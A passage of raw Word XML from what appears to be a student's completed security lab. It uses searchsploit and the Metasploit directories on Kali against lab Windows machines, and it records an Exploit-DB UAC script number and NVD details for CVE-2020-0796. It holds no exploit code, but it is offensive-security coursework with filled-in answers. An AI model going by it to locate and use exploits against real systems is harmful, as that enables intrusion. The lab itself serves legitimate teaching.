                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2F6023" w14:textId="77777777" w:rsidR="004B37AE" w:rsidRDefault="004B37AE" w:rsidP="004B37AE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F150BB6" w14:textId="756F3522" w:rsidR="00615B91" w:rsidRDefault="00615B91" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Reboot Windows 10 for changes to take effect</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="759C61E6" w14:textId="77777777" w:rsidR="00B71518" w:rsidRDefault="00615B91" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t>Attach a screen capture that demo the current state of RDP port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B18ECB9" w14:textId="77777777" w:rsidR="00B71518" w:rsidRDefault="00B71518" w:rsidP="00B71518">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="563E2815" w14:textId="1DB24E19" w:rsidR="0001541A" w:rsidRDefault="006452FB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="05105AA8" wp14:editId="6D1FADB8">
            <wp:extent cx="3215127" cy="54292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0582" cy="559044"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6AD631" w14:textId="09A81016" w:rsidR="006452FB" w:rsidRDefault="006452FB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F7DE041" w14:textId="6B10E34B" w:rsidR="006452FB" w:rsidRDefault="006452FB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01ECB19B" w14:textId="70663670" w:rsidR="006452FB" w:rsidRDefault="006452FB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C434A32" w14:textId="5C82331C" w:rsidR="006452FB" w:rsidRDefault="006452FB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09EF95F0" w14:textId="4757C6B8" w:rsidR="006452FB" w:rsidRDefault="006452FB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D6F52F8" w14:textId="02CEAA92" w:rsidR="006452FB" w:rsidRDefault="006452FB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D72588A" w14:textId="36BB7423" w:rsidR="006452FB" w:rsidRDefault="006452FB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50633091" w14:textId="084AF9F4" w:rsidR="006452FB" w:rsidRDefault="006452FB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F63BFDC" w14:textId="70C439EE" w:rsidR="006452FB" w:rsidRDefault="006452FB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32EF4597" w14:textId="204D7B83" w:rsidR="006452FB" w:rsidRDefault="006452FB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57881945" w14:textId="77777777" w:rsidR="006452FB" w:rsidRDefault="006452FB">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E58B1C5" w14:textId="5B8D337E" w:rsidR="003D7E98" w:rsidRDefault="00B70B17" w:rsidP="00A7517C">
      <w:pPr>
        <w:pStyle w:val="HeadingStyle1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Exploit vulnerable system</w:t>
      </w:r>
      <w:r w:rsidR="00814D14">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007438EC">
        <w:t xml:space="preserve">with Metasploit    </w:t>
      </w:r>
      <w:r w:rsidR="0001541A">
        <w:t xml:space="preserve">       ____4</w:t>
      </w:r>
      <w:r w:rsidR="00E37387">
        <w:t>5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381570B0" w14:textId="75D578CD" w:rsidR="00814D14" w:rsidRDefault="00814D14" w:rsidP="00706BE5">
      <w:pPr>
        <w:pStyle w:val="HeadingStyle1"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The objective of this exercise is to use Metasploit framework to exploit vulnerable </w:t>
      </w:r>
      <w:r w:rsidR="00706BE5">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>systems</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CEC0B1D" w14:textId="5A207582" w:rsidR="002A5879" w:rsidRDefault="002A5879" w:rsidP="00A04160">
      <w:pPr>
        <w:pStyle w:val="HeadingStyle1"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F86EF7">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Linux kali includes tools such as </w:t>
      </w:r>
      <w:r w:rsidRPr="00F86EF7">
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">metasploit </w:t>
      </w:r>
      <w:r w:rsidR="00F86EF7">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F86EF7" w:rsidRPr="00F86EF7">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>an open source framework that supp</w:t>
      </w:r>
      <w:r w:rsidR="00814D14">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">orts vulnerability research, </w:t>
      </w:r>
      <w:r w:rsidR="00F86EF7" w:rsidRPr="00F86EF7">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">exploit development and </w:t>
      </w:r>
      <w:r w:rsidR="00F86EF7">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">creation of custom security tools. Kali also includes </w:t>
      </w:r>
      <w:r w:rsidR="00EC7B64">
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>searchs</w:t>
      </w:r>
      <w:r w:rsidRPr="00F86EF7">
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ploit</w:t>
      </w:r>
      <w:r w:rsidRPr="00F86EF7">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F86EF7">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">command that will search exploit DB </w:t>
      </w:r>
      <w:r w:rsidR="00EC7B64">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId32" w:history="1">
        <w:r w:rsidR="00A04160" w:rsidRPr="006839D4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>https://www.exploit-db.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00A04160">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F86EF7">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>for exploits and shellcode. In this section we will explo</w:t>
      </w:r>
      <w:r w:rsidR="002C6AA7">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>re these tools to identify vulne</w:t>
      </w:r>
      <w:r w:rsidR="00F86EF7">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rabilities and exploits.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A5203C" w14:textId="59DFE9A8" w:rsidR="00ED4A90" w:rsidRPr="00F86EF7" w:rsidRDefault="00ED4A90" w:rsidP="00A04160">
      <w:pPr>
        <w:pStyle w:val="HeadingStyle1"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>For this exercise make sure all three machines kali2020</w:t>
      </w:r>
      <w:r w:rsidR="0001541A">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (attacker),</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Windows 7</w:t>
      </w:r>
      <w:r w:rsidR="0001541A">
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (victim)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and Windows 10 can communicate. Use ping command to verify connectivity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F063C8E" w14:textId="77777777" w:rsidR="00815306" w:rsidRDefault="00815306" w:rsidP="00815306"/>
    <w:p w14:paraId="5BCC3EBA" w14:textId="7EC25C6A" w:rsidR="00247A34" w:rsidRDefault="00706BE5" w:rsidP="00600E5B">
      <w:pPr>
        <w:ind w:left="1035"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r w:rsidR="001539E2" w:rsidRPr="001539E2">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(5 marks)</w:t>
      </w:r>
      <w:r w:rsidR="00EA5875">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DC61AB">
        <w:t xml:space="preserve">To learn the usage of </w:t>
      </w:r>
      <w:r w:rsidR="0001541A">
        <w:t xml:space="preserve">kali </w:t>
      </w:r>
      <w:r w:rsidR="00DC61AB">
        <w:t>searchsploit command, r</w:t>
      </w:r>
      <w:r w:rsidR="00247A34">
        <w:t xml:space="preserve">ead </w:t>
      </w:r>
      <w:r w:rsidR="00247A34" w:rsidRPr="00EA5875">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>man searchsploit</w:t>
      </w:r>
      <w:r w:rsidR="00247A34">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0001541A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00247A34">
        <w:t xml:space="preserve">and provide the </w:t>
      </w:r>
      <w:r w:rsidR="00DC61AB">
        <w:t xml:space="preserve">option or </w:t>
      </w:r>
      <w:r w:rsidR="00247A34">
        <w:t>syntax that will search for</w:t>
      </w:r>
      <w:r w:rsidR="001539E2">
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="00247A34">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F0CE47" w14:textId="57D03845" w:rsidR="004F1449" w:rsidRDefault="00247A34" w:rsidP="00C43A84">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Linux kernel 4.x exploits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0B8D40" w14:textId="6F539D8A" w:rsidR="004F1449" w:rsidRPr="004F1449" w:rsidRDefault="004F1449" w:rsidP="004F1449">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>searchsploit linux kernel 4.x</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69FAE5F9" w14:textId="75CF98B0" w:rsidR="00247A34" w:rsidRDefault="00356B15" w:rsidP="00C43A84">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Microsoft </w:t>
      </w:r>
      <w:r w:rsidR="00247A34">
        <w:t xml:space="preserve">Windows </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">10 </w:t>
      </w:r>
      <w:r w:rsidR="00247A34">
        <w:t>exploits</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382184F5" w14:textId="304EB862" w:rsidR="004F1449" w:rsidRPr="004F1449" w:rsidRDefault="004F1449" w:rsidP="004F1449">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>searchsploit microsoft windows 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09CAA3FD" w14:textId="25B2CD6D" w:rsidR="00247A34" w:rsidRDefault="00247A34" w:rsidP="00247A34">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>UAC</w:t>
      </w:r>
      <w:r w:rsidR="00DC61AB">
        <w:t xml:space="preserve"> exploits. </w:t>
      </w:r>
      <w:r w:rsidR="00426610">
        <w:t>Record</w:t>
      </w:r>
      <w:r w:rsidR="00DC61AB">
        <w:t xml:space="preserve"> the number of the script </w:t>
      </w:r>
      <w:r w:rsidR="00426610">
        <w:t xml:space="preserve">for Microsoft Windows 10 build 1809 </w:t>
      </w:r>
      <w:r w:rsidR="00172FE1">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="577F9481" w14:textId="3951BD81" w:rsidR="0027790C" w:rsidRDefault="0027790C" w:rsidP="0027790C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>searchsploit UAC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FDFD7EE" w14:textId="1B899F5E" w:rsidR="0027790C" w:rsidRPr="0027790C" w:rsidRDefault="0027790C" w:rsidP="0027790C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>47915</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5416D69B" w14:textId="09B3994A" w:rsidR="00426610" w:rsidRDefault="00426610" w:rsidP="00247A34">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What is the absolute path of these scripts?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A0C71F1" w14:textId="5698F518" w:rsidR="0027790C" w:rsidRPr="0027790C" w:rsidRDefault="0027790C" w:rsidP="0027790C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="0027790C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>usr/share/exploitdb/exploits</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECA52EA" w14:textId="1988497C" w:rsidR="00C55B9E" w:rsidRDefault="00C55B9E" w:rsidP="00247A34">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Attach a screen capture of one of the searches </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C77DB03" w14:textId="163F06FC" w:rsidR="004F1449" w:rsidRDefault="004F1449" w:rsidP="004F1449">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3EAB7184" wp14:editId="6BEDA0CF">
            <wp:extent cx="5943600" cy="2381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4110C40C" w14:textId="2292DFE4" w:rsidR="00E62771" w:rsidRDefault="00247A34" w:rsidP="00247A34">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B8740A7" w14:textId="13327115" w:rsidR="00B166C3" w:rsidRDefault="00B166C3" w:rsidP="00B166C3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Access  </w:t>
      </w:r>
      <w:r w:rsidRPr="00B166C3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>/usr/share/metasploit-framework</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  directory to explore  metasploits framework tools, modules and scripts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255C3480" w14:textId="7B4E0E34" w:rsidR="00862684" w:rsidRDefault="00325DC2" w:rsidP="00123EC6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001539E2">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(5 marks)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000D1AAB">
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="00B166C3">
        <w:t xml:space="preserve">ccess </w:t>
      </w:r>
      <w:r w:rsidR="00172FE1" w:rsidRPr="000C41DB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>/usr/share/metasploit-framework/data/exploits</w:t>
      </w:r>
      <w:r w:rsidR="000C41DB" w:rsidRPr="000C41DB">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000C41DB" w:rsidRPr="000C41DB">
        <w:t>and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C5D5C2" w14:textId="3328D60F" w:rsidR="00862684" w:rsidRDefault="00862684" w:rsidP="00862684">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Identify the following CVE-2020-0796. Explore this directory and provide file type</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40A8CD9F" w14:textId="323C25A7" w:rsidR="0052422F" w:rsidRPr="0052422F" w:rsidRDefault="0052422F" w:rsidP="0052422F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Direct link library, or .dll file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B7D1C83" w14:textId="77777777" w:rsidR="008A31F4" w:rsidRDefault="00862684" w:rsidP="008A31F4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Access NVD database an</w:t>
      </w:r>
      <w:r w:rsidR="00B309BC">
        <w:t>d search for CVE-2020-0796</w:t>
      </w:r>
      <w:r w:rsidR="008A31F4">
        <w:t xml:space="preserve"> and for more details about this vulnerability access Microsoft portal </w:t>
      </w:r>
      <w:hyperlink r:id="rId34" w:history="1">
        <w:r w:rsidR="008A31F4" w:rsidRPr="006839D4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="008A31F4">
        <w:t xml:space="preserve"> after examining this vulnerability provide the following</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5494CDDC" w14:textId="6C53D3A0" w:rsidR="008A31F4" w:rsidRDefault="008A31F4" w:rsidP="008A31F4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
      <w:r w:rsidR="00862684">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66EA865A" w14:textId="3F96767A" w:rsidR="00484968" w:rsidRPr="00484968" w:rsidRDefault="00484968" w:rsidP="00484968">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00484968">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>remote code execution vulnerability</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> through the SMBv3 protocol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A19F950" w14:textId="14D3B9DD" w:rsidR="008A31F4" w:rsidRDefault="008A31F4" w:rsidP="008A31F4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Platform: OS version and build</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="198E0A0F" w14:textId="47C52F1E" w:rsidR="00477BD9" w:rsidRPr="00477BD9" w:rsidRDefault="00477BD9" w:rsidP="00477BD9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Windows 10 version 1903</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD978B6" w14:textId="773FFF87" w:rsidR="008A31F4" w:rsidRDefault="008A31F4" w:rsidP="008A31F4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Impact</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3AD39A" w14:textId="31D697CD" w:rsidR="00995FA5" w:rsidRPr="00995FA5" w:rsidRDefault="00995FA5" w:rsidP="00995FA5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>6.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27180430" w14:textId="77777777" w:rsidR="00995FA5" w:rsidRDefault="008A31F4" w:rsidP="008A31F4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Severity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4765DE51" w14:textId="02155362" w:rsidR="008A31F4" w:rsidRDefault="00995FA5" w:rsidP="00995FA5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>10.0 CRITICAL</w:t>
      </w:r>
      <w:r w:rsidR="008A31F4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51A5A88F" w14:textId="54749F06" w:rsidR="00862684" w:rsidRDefault="008A31F4" w:rsidP="008A31F4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>W</w:t>
      </w:r>
      <w:r w:rsidR="00862684">
        <w:t>eakness</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190584BC" w14:textId="41314360" w:rsidR="00995FA5" w:rsidRPr="00995FA5" w:rsidRDefault="00995FA5" w:rsidP="00995FA5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CWE-119</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251BAFA0" w14:textId="19F28A5A" w:rsidR="008A31F4" w:rsidRDefault="008A31F4" w:rsidP="008A31F4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="40"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Mitigation or Workarounds(recommendations)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B25552" w14:textId="400F459B" w:rsidR="00995FA5" w:rsidRPr="00995FA5" w:rsidRDefault="00995FA5" w:rsidP="00995FA5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995FA5">
        <w:rPr>
